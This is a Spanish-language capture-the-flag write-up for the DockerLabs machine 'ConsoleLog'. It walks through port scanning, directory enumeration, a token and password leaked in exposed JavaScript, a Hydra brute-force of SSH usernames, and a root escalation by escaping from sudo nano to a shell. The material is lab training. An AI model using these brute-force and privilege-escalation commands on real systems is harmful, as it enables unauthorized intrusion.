# Write-up: ConsoleLog

**Sitio: DockerLabs**  
**Dificultad: Fácil**  
**Fecha: 22/07/2025**  
**Aprendizaje:**  
• Reforzar conocimientos de la herramienta `.

---

## 1 - Recopilación de información:  

> sudo nmap -p- -sSV -O --open --min-rate 5000 -vvv -n -Pn 172.17.0.2  

```
PORT     STATE SERVICE REASON         VERSION
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.61 ((Debian))
3000/tcp open  http    syn-ack ttl 64 Node.js Express framework
5000/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
```
`OS details`: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)

---

## 2 - Se entra a la página web y aparece un mensaje de bienvenida y un botoncito.  

---

## 3 - Reviso el código fuente:  

```
<!DOCTYPE html>
<html>
<head>
    <title>Mi Sitio</title>
    <script src="authentication.js"></script>
</head>
<body>
    <h1>Bienvenido a Mi Sitio</h1>
    <button onclick="autenticate()">Boton en fase beta</button>
</body>
</html>
```
### Luego voy al .js llamado "autentication" y me arroja esto:  

```
function autenticate() {
    console.log("Para opciones de depuracion, el token de /recurso/ es tokentraviesito");
}
```

Básicamente el botón activa la función del .js

---

## 4 - Enumeración de directorios:  

> gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -q -b 404,403

`/index.html`           (Status: 200) [Size: 234] => el principal
`/backend`              (Status: 301) [Size: 310] [--> http://172.17.0.2/backend/]

```
[PARENTDIR]	Parent Directory	 	- 	 
[DIR]	node_modules/	2024-07-29 12:41 	- 	 
[ ]	package-lock.json	2024-07-29 12:41 	25K	 
[ ]	package.json	2024-07-29 12:41 	271 	 
[TXT]	server.js	2024-07-29 13:00 	456 	
```

### Entro a cada archivo y me arrojan:  

• `server.js` ↓  

```
const express = require('express');  
const app = express();  

const port = 3000;  

app.use(express.json());  

app.post('/recurso/', (req, res) => {  
    const token = req.body.token;  
    if (token === 'tokentraviesito') {  
        res.send('lapassworddebackupmaschingonadetodas');  
    } else {  
        res.status(401).send('Unauthorized');  
    }
});  

app.listen(port, '0.0.0.0', () => {  
    console.log(`Backend listening at http://consolelog.lab:${port}`);  
});
```
• `package.json` ↓  

```	
name	"backend"  
version	"1.0.0"  
description	""  
main	"index.js"  
scripts	  
test	'echo "Error: no test specified" && exit 1'  
keywords	[]  
author	""  
license	"ISC"  
dependencies	  
express	"^4.19.2"  
```

• `package-lock.json` ↓   

Información general de node.js  

• `node_modules` ↓  

### Módulos de node.js  


`/javascript`           (Status: 301) [Size: 313] [--> http://172.17.0.2/javascript/] => nada  

---

5 - Leyendo la info obtenida, es obvio que la contraseña del backend es "lapassworddebackupmaschingonadetodas" por la que se usa para hacer fuerza bruta con Hydra, pero si se quisiera confirmar si la contraseña es esa y leyendo la info obtenida hasta el momento, con un curl se podría verificar:  

• curl -X POST -H "Content-Type: application/json" -d '{"token": "tokentraviesito"}' http://172.17.0.2:3000/recurso/  

• hydra -L /usr/share/wordlists/rockyou.txt -p lapassworddebackupmaschingonadetodas -V -f -t 16 ssh://172.17.0.2:5000  

user: `lovely`   
password: `lapassworddebackupmaschingonadetodas`  

---

6 - Entro por SSH:  

• ssh -l lovely 172.17.0.2 -p 5000  

pass: `lapassworddebackupmaschingonadetodas`  

---

7 - Una vez dentro:  

• sudo -l  

`(ALL) NOPASSWD: /usr/bin/nano`  

• ls -la  

```
drwx------ 1 lovely lovely 4096 Jul 30  2024 .  
drwxr-xr-x 1 root   root   4096 Jul 29  2024 ..  
-rw------- 1 lovely lovely   13 Jul 30  2024 .bash_history  
-rw-r--r-- 1 lovely lovely  220 Jul 29  2024 .bash_logout  
-rw-r--r-- 1 lovely lovely 3526 Jul 29  2024 .bashrc  
-rw-r--r-- 1 lovely lovely  807 Jul 29  2024 .profile  
```

•  find / -perm -4000 -type f 2>/dev/null  

```
/usr/bin/su  
/usr/bin/chfn  
/usr/bin/newgrp  
/usr/bin/gpasswd  
/usr/bin/passwd  
/usr/bin/umount  
/usr/bin/mount  
/usr/bin/chsh  
/usr/bin/sudo  
/usr/bin/nano  
/usr/lib/openssh/ssh-keysign  
/usr/lib/dbus-1.0/dbus-daemon-launch-helper  
```

---

8 - Veo que puedo ejecutar el editor 'nano' como sudo así que proceso a explotar eso apoyándome en GTFOBins:  

A - sudo nano  
b - CTRL + R  
C - CTRL + X  
D - reset; sh 1>&0 2>&0  
> E - whoami = `root`  
